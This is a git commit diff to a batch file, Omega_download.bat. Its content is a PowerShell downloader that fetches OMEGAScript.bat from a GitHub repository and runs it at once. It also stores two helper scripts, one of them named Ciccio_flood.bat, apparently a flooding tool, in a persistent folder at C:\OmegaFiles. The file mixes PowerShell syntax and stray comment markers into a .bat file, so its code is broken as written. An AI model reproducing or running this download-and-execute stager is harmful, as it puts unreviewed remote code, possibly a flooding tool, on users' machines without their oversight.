ef92c12c024cc04c64bb52467fac4d7c98a9e432
alpha840x <alpha840x@gmail.com>
2025-11-12 18:40:54 +0100

    Update Omega_download.bat

--- Omega_download.bat
+++ Omega_download.bat
@@ -1,14 +1,11 @@
-// powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/alpha840x/Omega_Script/main/OMEGAScript.bat' -OutFile '%TEMP%\OMEGAScript.bat'; Start-Process '%TEMP%\OMEGAScript.bat'"
-/*$tempFolder = "$env:TEMP\OmegaFiles"
-New-Item -ItemType Directory -Path $tempFolder -Force
+# Set a persistent folder for all downloads
+$folder = "C:\OmegaFiles"
+New-Item -ItemType Directory -Path $folder -Force | Out-Null
 
-# Download the main file and run it
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/alpha840x/Omega_Script/main/OMEGAScript.bat' -OutFile "$tempFolder\OMEGAScript.bat"
-Start-Process "$tempFolder\OMEGAScript.bat"
+# Download the main script and run it
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/alpha840x/Omega_Script/main/OMEGAScript.bat' -OutFile "$folder\OMEGAScript.bat"
+Start-Process "$folder\OMEGAScript.bat"
 
 # Download the helper files (do not run them)
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/alpha840x/Omega_Script/refs/heads/main/Ciccio_flood.bat' -OutFile "$tempFolder\Ciccio_flood.bat"
-
-Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/alpha840x/Omega_Script/refs/heads/main/folder.bat' -OutFile "$tempFolder\folder.bat"
-
-
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/alpha840x/Omega_Script/refs/heads/main/Ciccio_flood.bat' -OutFile "$folder\Ciccio_flood.bat"
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/alpha840x/Omega_Script/refs/heads/main/folder.bat' -OutFile "$folder\folder.bat"
